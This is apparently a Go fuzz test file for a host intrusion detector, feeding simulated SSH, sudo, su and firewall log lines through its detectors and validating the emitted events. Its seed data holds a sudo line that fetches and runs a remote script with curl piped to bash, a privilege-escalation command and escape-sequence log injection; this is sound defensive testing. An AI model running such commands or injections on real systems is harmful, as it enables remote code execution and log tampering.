package detect

import (
	"encoding/json"
	"strings"
	"testing"
	"time"

	"github.com/MrGuato/pisentry/internal/config"
	"github.com/MrGuato/pisentry/internal/engine"
	"github.com/MrGuato/pisentry/internal/event"
	"github.com/MrGuato/pisentry/internal/logsrc"
)

// authSeeds are the auth lines the attack simulation writes plus the other
// formats the matchers handle.
var authSeeds = []struct{ ident, msg string }{
	{"sshd", "Failed password for root from 203.0.113.66 port 41001 ssh2"},
	{"sshd", "Failed password for invalid user admin from 203.0.113.9 port 50000 ssh2"},
	{"sshd", "Accepted password for root from 203.0.113.66 port 41999 ssh2"},
	{"sshd", "Accepted publickey for pi from 2001:db8::1 port 22 ssh2: ED25519 SHA256:x"},
	{"sshd-session", "Invalid user from 203.0.113.9 port 1"},
	{"sshd", "Failed password for root from 203.0.113.66 from 198.51.100.1 port 1 ssh2"},
	{"sudo", "  mallory : user NOT in sudoers ; TTY=pts/9 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash"},
	{"sudo", "    pi : TTY=pts/0 ; PWD=/home/pi ; USER=root ; COMMAND=/bin/sh -c curl -fsSL http://203.0.113.7/x.sh | bash"},
	{"sudo", "eve : TTY=pts/1 ; USER=root ; COMMAND=/usr/sbin/usermod -aG sudo eve"},
	{"su", "(to root) pi on pts/0"},
	{"su", "FAILED SU (to root) pi on pts/0"},
	{"sshd", "Failed password for \x1b[2J\u202eroot from 203.0.113.66 port 41001 ssh2"},
}

// FuzzAuthHandle feeds attacker-written auth log lines through the auth
// detector and the engine, and checks every event that comes out is valid
// Event Schema v1 JSON. A local user can write any of these with logger(1).
func FuzzAuthHandle(f *testing.F) {
	for _, s := range authSeeds {
		f.Add(s.ident, s.msg, uint8(8))
	}
	f.Fuzz(func(t *testing.T, ident, msg string, repeat uint8) {
		d, s, c := newDeps(t, func(cfg *config.Config) { cfg.Logs.SSHRequireRoot = false })
		d, check := pipe(t, d, s)
		a := NewAuth(d)
		for i := 0; i <= int(repeat%24); i++ {
			a.Handle(logsrc.Line{Time: c.t, Ident: ident, Msg: msg, UID: 0})
			c.t = c.t.Add(time.Second)
		}
		check()
	})
}

// FuzzPortScanHandle: kernel firewall drop lines. The SRC field is attacker
// controlled on the wire; the whole line is attacker controlled in file mode.
func FuzzPortScanHandle(f *testing.F) {
	f.Add("[UFW BLOCK] IN=eth0 OUT= SRC=198.51.100.23 DST=192.0.2.10 PROTO=TCP SPT=55555 DPT=22 SYN", uint8(20))
	f.Add("IN=eth0 SRC=2001:db8::66 DST=2001:db8::1 PROTO=UDP DPT=53", uint8(3))
	f.Add("SRC=203.0.113.1 DST=192.0.2.255 DPT=137", uint8(1))
	f.Add("SRC=999.1.1.1 DPT=99999999999 SRC= DPT=", uint8(0))
	f.Fuzz(func(t *testing.T, msg string, repeat uint8) {
		d, s, c := newDeps(t, nil)
		d, check := pipe(t, d, s)
		p := NewPortScan(d)
		for i := 0; i <= int(repeat%32); i++ {
			// Vary the port so a scan can actually build up.
			m := strings.Replace(msg, "DPT=22", "DPT="+itoa(1+i), 1)
			p.Handle(logsrc.Line{Time: c.t, Ident: "kernel", Kernel: true, Msg: m})
			c.t = c.t.Add(time.Second)
		}
		check()
	})
}

// pipe routes the detector through a real engine (sanitizer, enrichment)
// and returns the rewired deps and a func that validates everything the
// sink received.
func pipe(t *testing.T, d Deps, s *sink) (Deps, func()) {
	t.Helper()
	eng := engine.New(d.Cfg, "fuzz-host", d.Store, d.M)
	eng.Now = d.Now
	eng.AddSink(engine.Sink(sinkAdapter{s}))
	d.Emit = eng
	return d, func() {
		t.Helper()
		for _, ev := range s.evs {
			raw, err := json.Marshal(ev)
			if err != nil {
				t.Fatal(err)
			}
			if err := event.ValidateJSON(raw); err != nil {
				t.Fatalf("invalid event %s: %v", raw, err)
			}
		}
	}
}
